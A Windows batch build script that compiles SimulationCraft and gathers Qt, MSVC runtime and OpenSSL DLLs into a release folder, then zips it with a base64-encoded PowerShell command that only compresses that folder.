
:: Necessary Qt dlls are packaged with every release.
:: These dlls are not included in the GIT.
:: They need to be copied into the dev area from the Qt install.
:: Qt-Framework is simply the Qt runtime dlls built against the MSVC 2013 compiler
:: It can be found at: http://qt.nokia.com/downloads
:: If you build SimC with MSVC 2013, then you need to use dlls from Qt-Framework
:: As of this writing, the default locations from which to gather the dlls are:
:: Qt-Framework: C:\Qt\Qt5.3.1\

:: Update the qt_dir as necessary
set qt_dir=C:\Qt\qt5.3.1\5.3\msvc2013
set install=simc-601-alpha-win32
set redist="C:\Program Files (x86)\Microsoft Visual Studio 12.0\VC\redist\x86\Microsoft.VC120.CRT"

:: IMPORTANT NOTE FOR DEBUGGING
:: This script will ONLY copy the optimized Qt dlls
:: The MSVC 2013 simcqt.vcproj file is setup to use optimized dlls for both Debug/Release builds
:: This script needs to be smarter if you wish to use the interactive debugger in the Qt SDK
:: The debug Qt dlls are named: Qt___d5.dll

:: Delete old folder/files

rd %install% /s /q
:: Copying new dlls

for /f "skip=2 tokens=2,*" %%A in ('reg.exe query "HKLM\SOFTWARE\Microsoft\MSBuild\ToolsVersions\12.0" /v MSBuildToolsPath') do SET MSBUILDDIR=%%B

"%MSBUILDDIR%msbuild.exe" E:\simulationcraft\simc_vs2013.sln /p:configuration=release /p:platform=win32

del /s simc_cache.dat
forfiles -s -m generate_????.simc -c "cmd /c echo Running @path && %~dp0simc.exe @file"

xcopy %qt_dir%\plugins\imageformats %install%\imageformats\
xcopy %redist%\msvcp120.dll %install%\
xcopy %redist%\msvcr120.dll %install%\
xcopy %redist%\vccorlib120.dll %install%\
xcopy %qt_dir%\bin\Qt5Core.dll %install%\
xcopy %qt_dir%\bin\Qt5OpenGL.dll %install%\
xcopy %qt_dir%\bin\Qt5PrintSupport.dll %install%\
xcopy %qt_dir%\bin\Qt5Quick.dll %install%\
xcopy %qt_dir%\bin\Qt5Qml.dll %install%\
xcopy %qt_dir%\bin\Qt5Positioning.dll %install%\
xcopy %qt_dir%\bin\Qt5Sql.dll %install%\
xcopy %qt_dir%\bin\Qt5Gui.dll %install%\
xcopy %qt_dir%\bin\Qt5Widgets.dll %install%\
xcopy %qt_dir%\bin\Qt5Network.dll %install%\
xcopy %qt_dir%\bin\Qt5WebKit.dll %install%\
xcopy %qt_dir%\bin\Qt5WebKitWidgets.dll %install%\
xcopy %qt_dir%\bin\Qt5Multimedia.dll %install%\
xcopy %qt_dir%\bin\Qt5MultimediaWidgets.dll %install%\
xcopy %qt_dir%\bin\Qt5Sensors.dll %install%\

xcopy %qt_dir%\bin\libGLESv2.dll %install%\
xcopy %qt_dir%\bin\icudt52.dll %install%\
xcopy %qt_dir%\bin\icuin52.dll %install%\
xcopy %qt_dir%\bin\icuuc52.dll %install%\
xcopy %qt_dir%\bin\libEGL.dll %install%\
xcopy %qt_dir%\bin\D3DCompiler_47.dll %install%\

xcopy %qt_dir%\plugins\platforms\qminimal.dll %install%\platforms\
xcopy %qt_dir%\plugins\platforms\qwindows.dll %install%\platforms\


:: Copy other relevant files for windows release
xcopy Welcome.html %install%\
xcopy Welcome.png %install%\
xcopy Simulationcraft.exe %install%\
xcopy simc.exe %install%\
xcopy readme.txt %install%\
xcopy Error.html %install%\
xcopy COPYING %install%\
xcopy Profiles %install%\profiles\ /s /e
xcopy C:\OpenSSL-Win32\bin\libeay32.dll %install%\
xcopy C:\OpenSSL-Win32\bin\ssleay32.dll %install%\


PowerShell -EncodedCommand WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAVwBpAHQAaABQAGEAcgB0AGkAYQBsAE4AYQBtAGUAKAAgACIAUwB5AHMAdABlAG0ALgBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBGAGkAbABlAFMAeQBzAHQAZQBtACIAIAApAA0ACgAkAHMAcgBjAF8AZgBvAGwAZABlAHIAIAA9ACAAIgBFADoAXABzAGkAbQB1AGwAYQB0AGkAbwBuAGMAcgBhAGYAdABcAHMAaQBtAGMALQA2ADAAMQAtAGEAbABwAGgAYQAtAHcAaQBuADMAMgAiAA0ACgAkAGQAZQBzAHQAZgBpAGwAZQAgAD0AIAAiAEUAOgBcAHMAaQBtAHUAbABhAHQAaQBvAG4AYwByAGEAZgB0AFwAcwBpAG0AYwAtADYAMAAxAC0AYQBsAHAAaABhAC0AdwBpAG4AMwAyAC4AegBpAHAAIgANAAoAJABjAG8AbQBwAHIAZQBzAHMAaQBvAG4ATABlAHYAZQBsACAAPQAgAFsAUwB5AHMAdABlAG0ALgBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ATABlAHYAZQBsAF0AOgA6AE8AcAB0AGkAbQBhAGwADQAKACQAaQBuAGMAbAB1AGQAZQBiAGEAcwBlAGQAaQByACAAPQAgACQAZgBhAGwAcwBlAA0ACgByAGUAbQBvAHYAZQAtAGkAdABlAG0AIAAtAHAAYQB0AGgAIAAkAGQAZQBzAHQAZgBpAGwAZQANAAoAWwBTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAFoAaQBwAEYAaQBsAGUAXQA6ADoAQwByAGUAYQB0AGUARgByAG8AbQBEAGkAcgBlAGMAdABvAHIAeQAoACQAcwByAGMAXwBmAG8AbABkAGUAcgAsACQAZABlAHMAdABmAGkAbABlACwAJABjAG8AbQBwAHIAZQBzAHMAaQBvAG4ATABlAHYAZQBsACwAIAAkAGkAbgBjAGwAdQBkAGUAYgBhAHMAZQBkAGkAcgAgACkA


pause